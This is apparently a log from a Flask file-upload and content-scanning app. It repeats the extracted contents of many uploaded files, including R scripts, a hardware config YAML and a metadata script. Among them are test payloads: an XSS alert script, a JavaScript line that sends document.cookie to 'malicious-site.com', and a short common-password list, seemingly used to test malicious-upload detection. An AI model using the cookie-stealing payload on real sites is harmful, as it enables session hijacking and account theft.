     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:54:06,426 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:54:06,427 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:54:06,429 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,430 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,431 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,432 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:54:06,434 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,435 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,436 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:54:06,438 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:54:06,440 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:54:06,442 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:54:06,443 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,444 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,445 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,446 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:54:06,448 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,449 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,450 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,451 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,452 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,453 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:54:06,454 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,455 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,456 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,457 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,458 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,459 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:54:06,460 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,462 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,463 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,464 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,465 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,466 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:54:06,467 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,468 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,469 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,470 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,471 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,472 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:54:06,474 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,475 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,476 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,477 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,478 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,479 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:54:06,480 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,481 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,485 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:54:06,485 - [33mPress CTRL+C to quit[0m
2025-02-22 20:54:10,504 - 127.0.0.1 - - [22/Feb/2025 20:54:10] "GET / HTTP/1.1" 200 -
2025-02-22 20:54:17,015 - 127.0.0.1 - - [22/Feb/2025 20:54:17] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:54:17,020 - 127.0.0.1 - - [22/Feb/2025 20:54:17] "GET / HTTP/1.1" 200 -
2025-02-22 20:56:14,989 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:56:14,992 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:56:14,993 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:56:14,995 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:56:14,996 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:14,997 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:14,998 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:14,999 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:56:15,001 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,002 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,004 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:56:15,005 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:56:15,006 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:56:15,008 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:56:15,009 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,010 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,011 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,012 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:56:15,015 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,016 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,018 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:56:15,020 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:56:15,021 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:56:15,023 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:56:15,024 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,026 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,028 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,029 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:56:15,032 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,033 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,035 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,036 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,037 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,038 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:56:15,040 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,041 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,043 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,044 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,045 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,046 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:56:15,047 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,049 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,050 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,052 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:56:15,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
